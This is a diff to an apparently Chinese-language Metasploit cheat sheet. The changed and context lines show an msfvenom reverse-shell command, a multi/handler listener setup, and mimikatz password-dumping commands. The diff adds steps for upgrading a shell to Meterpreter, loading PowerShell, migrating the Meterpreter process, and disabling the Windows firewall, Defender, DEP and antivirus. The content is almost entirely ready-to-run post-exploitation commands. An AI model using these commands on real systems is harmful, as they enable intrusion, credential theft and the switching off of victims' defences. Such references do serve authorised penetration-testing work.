@@ -194,7 +194,7 @@ Perl:
 msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
 ```
 
-###监听
+### 监听
 
 ```csharp
 set PAYLOAD <Payload name>
@@ -205,6 +205,7 @@ exploit -j –z  -j(作为job开始运行)和-z(不立即进行session交换--�
 ```
 
 ```bash
+use exploit/multi/handler
 msf exploit(handler) > set LHOST 172.16.0.4
 msf exploit(handler) > set ExitOnSession false
 msf exploit(handler) > exploit -j -z  
@@ -223,6 +224,26 @@ msf exploit(handler) > sessions -k 2   结束会话
 Ctrl+z  把会话放到后台
 Ctrl+c  结束会话
 ```
+
+### 将cmdshell升级成meterpreter
+
+` sessions -u cmdshell的id `
+
+
+
+### 加载powershell
+
+```
+meterpreter > load powershell 
+Loading extension powershell...Success.
+meterpreter > powershell_shell 
+PS > whoami
+go0s-pc\go0s
+```
+
+
+
+
 
 ## Meterpreter后攻击
 
@@ -279,6 +300,32 @@ wdigest  #获取Wdigest密码
 mimikatz_command -f samdump::hashes  #执行mimikatz原始命令
 mimikatz_command -f sekurlsa::searchPasswords
 ```
+
+
+
+### 迁移meterpreter进程
+
+```
+找到一个相对稳定的应用记住他的pid ，然后将  meterpreter shell 的pid换成它的。
+
+输入migrate 7240（将meterpreter shell的pid调到7240里相对稳定应用的进程里了，然后用getpid再次查看下是否更换成功）
+```
+
+
+
+### 关闭防火墙/杀毒软件
+
+windows
+
+```
+netsh advfirewall set allprofiles state off#关闭防火墙
+net stop windefend
+netsh firewall set opmode mode=disable
+bcdedit.exe /set{current} nx AlwaysOff#关闭DEP
+meterpreter > run killav  关闭杀毒软件 
+```
+
+
 
 
 
